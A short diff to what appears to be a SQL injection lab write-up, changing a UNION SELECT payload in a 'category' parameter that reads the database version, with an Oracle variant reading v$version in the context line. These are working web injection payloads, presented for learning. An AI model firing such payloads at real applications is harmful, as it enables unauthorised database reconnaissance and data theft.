@@ -60,7 +60,7 @@ Lifestyle'+UNION+SELECT+banner,null+FROM+v$version--
 ### Payload
 
 ```text
-category=Pets'+union+select+@@version,+null--
+category=Pets'+union+select+@@version,+null--+
 ```
 
 ### Result
